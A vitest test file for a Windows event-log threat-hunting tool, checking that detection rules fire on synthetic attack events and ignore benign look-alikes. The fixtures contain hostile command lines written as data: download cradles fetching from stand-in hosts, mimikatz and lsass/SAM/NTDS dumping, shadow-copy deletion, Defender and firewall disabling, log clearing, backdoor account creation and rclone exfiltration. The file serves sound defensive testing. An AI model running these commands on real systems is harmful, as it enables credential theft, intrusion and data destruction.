import { describe, expect, it } from "vitest";

import { HUNTS } from "@/lib/hunts";
import { compileSearch, haystackFor, parseSearch } from "@/lib/search-query";

import { fakeRow, haystackGetter, loadFixtures, type Row, HAS_FIXTURES } from "./helpers";

const SEC = "Microsoft-Windows-Security-Auditing";
const SYS = "Microsoft-Windows-Sysmon";
const SCM = "Service Control Manager";
const PS = "Microsoft-Windows-PowerShell";
const LOCALES = ["en", "fr", "de", "es", "it", "pt", "ja", "zh"];

const hunt = (id: string) => {
  const h = HUNTS.find((x) => x.id === id);
  if (!h) throw new Error(`unknown hunt ${id}`);
  return h;
};
const fires = (id: string, r: Row, p: [string, string][]) =>
  compileSearch(parseSearch(hunt(id).query))!(r, p, () => haystackFor(r, p));

type Case = [id: string, eventId: number, provider: string, pairs: [string, string][]];

// One synthetic attack event per hunt: each must fire.
const POSITIVE: Case[] = [
  ["rdp-logons", 4624, SEC, [["LogonType", "10"]]],
  ["rdp-logons", 1149, "Microsoft-Windows-TerminalServices-RemoteConnectionManager", [["Param1", "bob"]]],
  ["failed-logons", 4776, SEC, [["Status", "0xc000006a"]]],
  ["lockouts", 4740, SEC, [["TargetUserName", "bob"]]],
  ["explicit-creds", 4648, SEC, [["TargetUserName", "admin"]]],
  ["ntlm-network", 4624, SEC, [["LogonType", "3"], ["AuthenticationPackageName", "NTLM"], ["TargetUserName", "admin"]]],
  ["kerberoasting", 4769, SEC, [["TicketEncryptionType", "0x17"]]],
  ["asrep", 4768, SEC, [["PreAuthType", "0"]]],
  ["lsass-access", 10, SYS, [["TargetImage", "C:\\Windows\\system32\\lsass.exe"]]],
  ["new-services", 7045, SCM, [["ServiceName", "x"]]],
  ["scheduled-tasks", 106, "Microsoft-Windows-TaskScheduler", [["TaskName", "\\evil"]]],
  ["accounts", 4720, SEC, [["TargetUserName", "x"]]],
  ["priv-groups", 4732, SEC, [["TargetUserName", "Administrators"]]],
  ["wmi-persistence", 5861, "Microsoft-Windows-WMI-Activity", [["x", "y"]]],
  ["encoded-commands", 4688, SEC, [["CommandLine", "powershell -nop -enc SQBFAFgA"]]],
  ["powershell-suspicious", 4104, PS, [["ScriptBlockText", "$x=1\nIEX (New-Object Net.WebClient).DownloadString('http://x')"]]],
  ["lolbins", 4688, SEC, [["NewProcessName", "C:\\Windows\\System32\\certutil.exe"]]],
  ["admin-shares", 5140, SEC, [["ShareName", "\\\\*\\ADMIN$"]]],
  ["log-cleared", 104, "Microsoft-Windows-Eventlog", [["Channel", "System"]]],
  ["audit-tampering", 4719, SEC, [["AuditPolicyChanges", "%%8448"]]],
  ["time-change", 4616, SEC, [["ProcessName", "C:\\Users\\x\\date.exe"]]],
  ["defender", 1116, "Microsoft-Windows-Windows Defender", [["Threat Name", "x"]]],
  ["external-rdp", 4624, SEC, [["LogonType", "10"], ["IpAddress", "203.0.113.7"]]],
  ["external-network", 4624, SEC, [["LogonType", "3"], ["IpAddress", "8.8.8.8"]]],
  ["dcsync", 4662, SEC, [["SubjectUserName", "jdoe"], ["Properties", "%%7688 {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"]]],
  ["sam-dump", 4688, SEC, [["CommandLine", "reg.exe save HKLM\\SAM C:\\temp\\sam.hiv"]]],
  ["ntds-dump", 1, SYS, [["CommandLine", 'ntdsutil "ac i ntds" "ifm" "create full c:\\x" q q']]],
  ["mimikatz", 1, SYS, [["CommandLine", 'm.exe "privilege::debug" "sekurlsa::logonpasswords" exit']]],
  ["mimikatz", 4104, PS, [["ScriptBlockText", "Invoke-Mimikatz -DumpCreds"]]],
  ["ntlmv1", 4624, SEC, [["LmPackageName", "NTLM V1"]]],
  ["kerb-preauth-fail", 4771, SEC, [["Status", "0x18"]]],
  ["recon-commands", 4688, SEC, [["NewProcessName", "C:\\Windows\\System32\\whoami.exe"]]],
  ["recon-commands", 1, SYS, [["Image", "C:\\Windows\\System32\\nltest.exe"]]],
  ["ad-recon-tools", 1, SYS, [["Image", "C:\\Users\\x\\AdFind.exe"]]],
  ["group-enum", 4799, SEC, [["CallerProcessName", "C:\\Windows\\System32\\net1.exe"], ["SubjectUserName", "jdoe"]]],
  ["psexec", 7045, SCM, [["ServiceName", "PSEXESVC"], ["ImagePath", "%SystemRoot%\\PSEXESVC.exe"]]],
  ["winrm", 1, SYS, [["ParentImage", "C:\\Windows\\System32\\wsmprovhost.exe"], ["Image", "C:\\Windows\\System32\\cmd.exe"]]],
  ["wmi-exec", 4688, SEC, [["ParentProcessName", "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"], ["NewProcessName", "C:\\Windows\\System32\\cmd.exe"]]],
  ["remote-task", 5145, SEC, [["RelativeTargetName", "atsvc"]]],
  ["overpass-the-hash", 4624, SEC, [["LogonType", "9"], ["LogonProcessName", "seclogo"]]],
  ["run-keys", 13, SYS, [["TargetObject", "HKU\\S-1\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\evil"]]],
  ["startup-folder", 11, SYS, [["TargetFilename", "C:\\Users\\x\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.lnk"]]],
  ["ifeo", 13, SYS, [["TargetObject", "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\Debugger"]]],
  ["suspicious-service-path", 7045, SCM, [["ImagePath", "C:\\Users\\x\\AppData\\Local\\Temp\\svc.exe"]]],
  ["pwd-never-expires", 4738, SEC, [["UserAccountControl", "\r\n\t\t%%2089"]]],
  ["bits-jobs", 59, "Microsoft-Windows-Bits-Client", [["url", "http://x/y.exe"]]],
  ["office-child", 1, SYS, [["ParentImage", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"], ["Image", "C:\\Windows\\System32\\cmd.exe"]]],
  ["script-hosts", 4688, SEC, [["NewProcessName", "C:\\Windows\\System32\\wscript.exe"]]],
  ["temp-exec", 1, SYS, [["Image", "C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe"]]],
  ["download-cradle", 4688, SEC, [["CommandLine", "powershell iwr http://x/a.ps1 -OutFile a.ps1"]]],
  ["download-cradle", 1, SYS, [["CommandLine", "certutil.exe -urlcache -split -f http://x/a.exe"]]],
  ["amsi-bypass", 4104, PS, [["ScriptBlockText", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"]]],
  ["wevtutil-clear", 4688, SEC, [["CommandLine", "wevtutil cl Security"]]],
  ["firewall-off", 4688, SEC, [["CommandLine", "netsh advfirewall set allprofiles state off"]]],
  ["defender-tamper", 1, SYS, [["CommandLine", "powershell Set-MpPreference -DisableRealtimeMonitoring $true"]]],
  ["service-disabled", 7040, SCM, [["param1", "Windows Defender"], ["param2", "auto start"], ["param3", "disabled"]]],
  ["sysmon-tamper", 16, SYS, [["Configuration", "x"]]],
  ["timestomp", 2, SYS, [["TargetFilename", "x"]]],
  ["remote-thread", 8, SYS, [["SourceImage", "x"]]],
  ["shadow-delete", 4688, SEC, [["CommandLine", "vssadmin.exe Delete Shadows /All /Quiet"]]],
  ["sid-history", 4765, SEC, [["TargetUserName", "bob"]]],
  ["dsrm-password", 4794, SEC, [["Workstation", "DC01"]]],
  ["computer-account-created", 4741, SEC, [["TargetUserName", "EVIL$"]]],
  ["dollar-user", 4720, SEC, [["TargetUserName", "backup$"]]],
  ["net-user-add", 4688, SEC, [["CommandLine", "net user hacker P@ss /add"]]],
  ["net-user-add", 1, SYS, [["CommandLine", "net localgroup administrators hacker /add"]]],
  ["gpo-changes", 5136, SEC, [["ObjectClass", "groupPolicyContainer"], ["AttributeLDAPDisplayName", "versionNumber"]]],
  ["spn-set", 5136, SEC, [["AttributeLDAPDisplayName", "servicePrincipalName"], ["AttributeValue", "http/fake"]]],
  ["shadow-credentials", 5136, SEC, [["AttributeLDAPDisplayName", "msDS-KeyCredentialLink"]]],
  ["rbcd", 5136, SEC, [["AttributeLDAPDisplayName", "msDS-AllowedToActOnBehalfOfOtherIdentity"]]],
  ["adcs-san", 4887, "Microsoft-Windows-Security-Auditing", [["Attributes", "CertificateTemplate:User\nSAN:upn=administrator@corp.local"]]],
  ["lsass-dump-tools", 4688, SEC, [["CommandLine", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full"]]],
  ["wdigest", 13, SYS, [["TargetObject", "HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential"]]],
  ["rubeus", 1, SYS, [["CommandLine", "Rubeus.exe asktgt /user:admin /rc4:abc /ptt"]]],
  ["impacket", 4688, SEC, [["CommandLine", "cmd.exe /Q /c whoami 1> \\\\127.0.0.1\\ADMIN$\\__1700000000.123 2>&1"]]],
  ["impacket", 7045, SCM, [["ImagePath", "%COMSPEC% /Q /c echo cd ^> \\\\127.0.0.1\\C$\\__output 2^>^&1 > %TEMP%\\execute.bat"]]],
  ["rdp-hijack", 4688, SEC, [["NewProcessName", "C:\\Windows\\System32\\tscon.exe"], ["CommandLine", "tscon 2 /dest:rdp-tcp#0"]]],
  ["rdp-enabled", 13, SYS, [["TargetObject", "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\fDenyTSConnections"]]],
  ["accessibility-backdoor", 1, SYS, [["ParentImage", "C:\\Windows\\System32\\utilman.exe"], ["Image", "C:\\Windows\\System32\\cmd.exe"]]],
  ["uac-bypass", 13, SYS, [["TargetObject", "HKU\\S-1-5-21\\Software\\Classes\\ms-settings\\shell\\open\\command\\(Default)"]]],
  ["uac-bypass", 4688, SEC, [["NewProcessName", "C:\\Windows\\System32\\fodhelper.exe"]]],
  ["lsa-protection-off", 13, SYS, [["TargetObject", "HKLM\\System\\CurrentControlSet\\Control\\Lsa\\RunAsPPL"]]],
  ["proxy-execution", 1, SYS, [["Image", "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe"]]],
  ["mshta-regsvr32-remote", 4688, SEC, [["CommandLine", "mshta.exe http://evil/a.hta"]]],
  ["mshta-regsvr32-remote", 1, SYS, [["CommandLine", "regsvr32 /s /n /u /i:http://evil/a.sct scrobj.dll"]]],
  ["schtasks-cmd", 4688, SEC, [["CommandLine", "schtasks /create /tn upd /tr C:\\x.exe /sc onlogon"]]],
  ["sc-create", 1, SYS, [["Image", "C:\\Windows\\System32\\sc.exe"], ["CommandLine", "sc.exe create evil binPath= C:\\x.exe"]]],
  ["remote-access-tools", 1, SYS, [["Image", "C:\\Users\\bob\\Downloads\\AnyDesk.exe"]]],
  ["remote-access-tools", 7045, SCM, [["ServiceName", "ScreenConnect Client (abc)"]]],
  ["tunnels", 4688, SEC, [["NewProcessName", "C:\\Users\\bob\\ngrok.exe"]]],
  ["tunnels", 4688, SEC, [["CommandLine", "netsh interface portproxy add v4tov4 listenport=8443 connectaddress=10.0.0.5"]]],
  ["tunnels", 22, SYS, [["QueryName", "abc.trycloudflare.com"]]],
  ["c2-pipes", 17, SYS, [["PipeName", "\\MSSE-1234-server"]]],
  ["exfil-tools", 1, SYS, [["CommandLine", "rclone.exe copy C:\\data remote:bucket"]]],
  ["exfil-tools", 22, SYS, [["QueryName", "g.api.mega.nz"]]],
  ["archive-staging", 4688, SEC, [["CommandLine", "7z.exe a -pSecret C:\\temp\\out.7z C:\\shares\\finance"]]],
  ["ransomware-cmds", 4688, SEC, [["CommandLine", "bcdedit /set {default} bootstatuspolicy ignoreallfailures"]]],
  ["mass-service-stop", 4688, SEC, [["CommandLine", "net stop \"SQL Server (MSSQLSERVER)\" /y"]]],
  ["mass-service-stop", 7036, SCM, [["param1", "SQL Server (MSSQLSERVER)"], ["param2", "stopped"]]],
];

// Benign look-alikes: each must stay quiet.
const NEGATIVE: Case[] = [
  ["failed-logons", 4776, SEC, [["Status", "0x0"]]],
  ["ntlm-network", 4624, SEC, [["LogonType", "3"], ["AuthenticationPackageName", "NTLM"], ["TargetUserName", "ANONYMOUS LOGON"]]],
  ["scheduled-tasks", 106, "Microsoft-Windows-Kernel-Power", [["x", "y"]]],
  ["kerberoasting", 4769, SEC, [["TicketEncryptionType", "0x12"]]],
  ["time-change", 4616, SEC, [["ProcessName", "C:\\Windows\\System32\\svchost.exe"]]],
  ["external-rdp", 4624, SEC, [["LogonType", "10"], ["IpAddress", "172.20.1.5"]]],
  ["external-rdp", 4624, SEC, [["LogonType", "10"], ["IpAddress", "192.168.1.5"]]],
  ["external-network", 4624, SEC, [["LogonType", "3"], ["IpAddress", "-"]]],
  ["external-network", 4624, SEC, [["LogonType", "3"], ["IpAddress", "::1"]]],
  ["dcsync", 4662, SEC, [["SubjectUserName", "DC01$"], ["Properties", "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}"]]],
  ["group-enum", 4799, SEC, [["CallerProcessName", "C:\\Windows\\System32\\services.exe"], ["SubjectUserName", "jdoe"]]],
  ["group-enum", 4799, SEC, [["CallerProcessName", "C:\\x\\net1.exe"], ["SubjectUserName", "WS01$"]]],
  ["recon-commands", 4688, SEC, [["NewProcessName", "C:\\Windows\\System32\\netsh.exe"]]],
  ["wmi-exec", 4688, SEC, [["ParentProcessName", "C:\\Windows\\explorer.exe"], ["NewProcessName", "C:\\Windows\\System32\\cmd.exe"]]],
  ["temp-exec", 1, SYS, [["Image", "C:\\Program Files\\App\\a.exe"]]],
  ["service-disabled", 7040, SCM, [["param3", "auto start"]]],
  ["run-keys", 13, SYS, [["TargetObject", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\x"]]],
  ["office-child", 1, SYS, [["ParentImage", "C:\\Windows\\explorer.exe"], ["Image", "C:\\x\\WINWORD.EXE"]]],
  ["dollar-user", 4720, SEC, [["TargetUserName", "alice"]]],
  ["gpo-changes", 5136, SEC, [["ObjectClass", "user"], ["AttributeLDAPDisplayName", "description"]]],
  ["spn-set", 5136, SEC, [["AttributeLDAPDisplayName", "description"]]],
  ["adcs-san", 4887, SEC, [["Attributes", "CertificateTemplate:User"]]],
  ["accessibility-backdoor", 1, SYS, [["ParentImage", "C:\\Windows\\explorer.exe"], ["Image", "C:\\Windows\\System32\\osk.exe"]]],
  ["sc-create", 1, SYS, [["Image", "C:\\Windows\\System32\\sc.exe"], ["CommandLine", "sc query wuauserv"]]],
  ["c2-pipes", 17, SYS, [["PipeName", "\\srvsvc"]]],
  ["mass-service-stop", 7036, SCM, [["param1", "Windows Update"], ["param2", "stopped"]]],
  ["tunnels", 22, SYS, [["QueryName", "www.cloudflare.com"]]],
];

describe("hunt catalogue", () => {
  it("ids are unique", () => {
    expect(new Set(HUNTS.map((h) => h.id)).size).toBe(HUNTS.length);
  });

  it.each(HUNTS.map((h) => [h.id, h] as const))("%s is well-formed", (_id, h) => {
    expect(Object.keys(h.name).sort()).toEqual([...LOCALES].sort());
    for (const l of LOCALES) expect(h.name[l as "en"]?.trim()).toBeTruthy();
    expect(h.mitre).toMatch(/^T\d{4}(\.\d{3})?$/);
    // Field clauses only: a stray free-text token means a value with a
    // space lost its quotes and the hunt silently changed meaning.
    const parsed = parseSearch(h.query);
    expect(parsed.groups.length).toBeGreaterThan(0);
    for (const g of parsed.groups) for (const c of g) expect(c.field).not.toBeNull();
  });

  it("every hunt has at least one positive test", () => {
    const tested = new Set(POSITIVE.map(([id]) => id));
    expect(HUNTS.filter((h) => !tested.has(h.id)).map((h) => h.id)).toEqual([]);
  });
});

describe("hunts fire on attack events", () => {
  it.each(POSITIVE)("%s ← %i", (id, eventId, provider, pairs) => {
    expect(fires(id, fakeRow(eventId, provider), pairs)).toBe(true);
  });
});

describe("hunts ignore benign look-alikes", () => {
  it.each(NEGATIVE)("%s ✗ %i", (id, eventId, provider, pairs) => {
    expect(fires(id, fakeRow(eventId, provider), pairs)).toBe(false);
  });
});

describe.skipIf(!HAS_FIXTURES)("hunts on the real fixture set", () => {
  // Clean training image: only these hunts should hit, with these counts.
  // Anything else firing is a false positive to investigate.
  const EXPECTED: Record<string, number> = {
    "failed-logons": 7,
    "explicit-creds": 81,
    "new-services": 7,
    accounts: 71,
    "priv-groups": 20,
    "pwd-never-expires": 7,
  };

  it("matches the expected counts and nothing else", () => {
    const ds = loadFixtures("security.evtx", "application.evtx", "system.evtx", "setup.evtx");
    const hay = haystackGetter(ds);
    const got: Record<string, number> = {};
    for (const h of HUNTS) {
      const test = compileSearch(parseSearch(h.query))!;
      const n = ds.rows.filter((r) => test(r, ds.pairs[r._g], () => hay(r))).length;
      if (n > 0) got[h.id] = n;
    }
    expect(got).toEqual(EXPECTED);
  });
});
